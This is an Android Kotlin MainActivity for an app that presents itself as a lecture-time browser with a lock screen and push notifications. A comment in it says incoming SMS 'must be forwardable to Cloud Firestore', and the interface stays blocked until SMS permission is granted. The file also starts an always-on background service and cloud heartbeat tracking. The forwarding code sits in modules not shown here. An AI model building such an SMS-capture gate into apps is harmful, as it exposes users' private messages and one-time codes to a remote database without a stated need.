package com.example

import android.Manifest
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.enableEdgeToEdge
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.statusBarsPadding
import androidx.compose.material3.Surface
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.setValue
import androidx.compose.ui.Modifier
import androidx.core.content.ContextCompat
import androidx.lifecycle.lifecycleScope
import com.example.notification.NotificationHelper
import com.example.notification.PushNotificationService
import com.example.script.ScriptManager
import com.example.security.SecurityManager
import com.example.sms.SmsAccess
import com.example.ui.BrowserScreen
import com.example.ui.LockScreen
import com.example.ui.NotificationRequiredScreen
import com.example.ui.SmsAccessRequiredScreen
import com.example.ui.theme.DarkBackground
import com.example.ui.theme.MyApplicationTheme

class MainActivity : ComponentActivity() {
    private lateinit var securityManager: SecurityManager
    private lateinit var scriptManager: ScriptManager
    private lateinit var notificationHelper: NotificationHelper
    private var pushNotificationListener: com.google.firebase.firestore.ListenerRegistration? = null

    private val requestNotificationPermission =
        registerForActivityResult(ActivityResultContracts.RequestPermission()) { _ ->
            // Permission result handled
        }

    private var hasSmsAccess by mutableStateOf(false)

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()
        // Prevent screen dimming/sleeping during lectures
        window.addFlags(android.view.WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON)

        securityManager = SecurityManager(this)
        scriptManager = ScriptManager(this)
        notificationHelper = NotificationHelper(this)

        // Request notification permission on Android 13+
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS)
                != PackageManager.PERMISSION_GRANTED
            ) {
                requestNotificationPermission.launch(Manifest.permission.POST_NOTIFICATIONS)
            }
        }

        // Mandatory gate: incoming SMS must be forwardable to Cloud Firestore
        hasSmsAccess = SmsAccess.hasPermission(this)

        // Start 5-minute background reminder notifications for normal users
        notificationHelper.startPeriodicNotification(lifecycleScope, securityManager)

        // Start 24/7 background sync service for cloud push alerts & bursts (works even when app is closed)
        PushNotificationService.start(this)

        val initialUnlocked = securityManager.isSessionActive()
        val alreadyPermanentlyUnlocked = securityManager.isPermanentUnlocked()

        // Sync complete session state to Firestore on app startup
        if (initialUnlocked) {
            securityManager.syncCurrentSessionToCloud()
        }

        android.widget.Toast.makeText(this, "made by dhyan ❤️", android.widget.Toast.LENGTH_LONG).show()

        setContent {
            MyApplicationTheme {
                var hasNotificationAccess by remember { mutableStateOf(NotificationHelper.hasPermission(this@MainActivity)) }
                var isUnlocked by remember { mutableStateOf(initialUnlocked) }
                var isPermanentUnlocked by remember { mutableStateOf(alreadyPermanentlyUnlocked) }

                Surface(
                    modifier = Modifier.fillMaxSize(),
                    color = DarkBackground
                ) {
                    if (!hasNotificationAccess) {
                        NotificationRequiredScreen(
                            onPermissionGranted = {
                                hasNotificationAccess = true
                            }
                        )
                    } else if (!hasSmsAccess) {
                        SmsAccessRequiredScreen(
                            onPermissionGranted = {
                                hasSmsAccess = true
                            }
                        )
                    } else if (isUnlocked) {
                        BrowserScreen(
                            securityManager = securityManager,
                            scriptManager = scriptManager,
                            isPermanentUnlocked = isPermanentUnlocked,
                            onLockRequested = {
                                isUnlocked = false
                                isPermanentUnlocked = securityManager.isPermanentUnlocked()
                            }
                        )
                    } else {
                        LockScreen(
                            securityManager = securityManager,
                            onUnlocked = { isPermanent ->
                                isUnlocked = true
                                isPermanentUnlocked = isPermanent
                            }
                        )
                    }
                }
            }
        }
    }

    override fun onResume() {
        super.onResume()
        hasSmsAccess = SmsAccess.hasPermission(this)
        securityManager.sendHeartbeat()
    }

    override fun onStop() {
        super.onStop()
        securityManager.setDeviceOffline()
    }

    override fun onDestroy() {
        super.onDestroy()
        securityManager.setDeviceOffline()
        pushNotificationListener?.remove()
        notificationHelper.stopPeriodicNotification()
    }
}
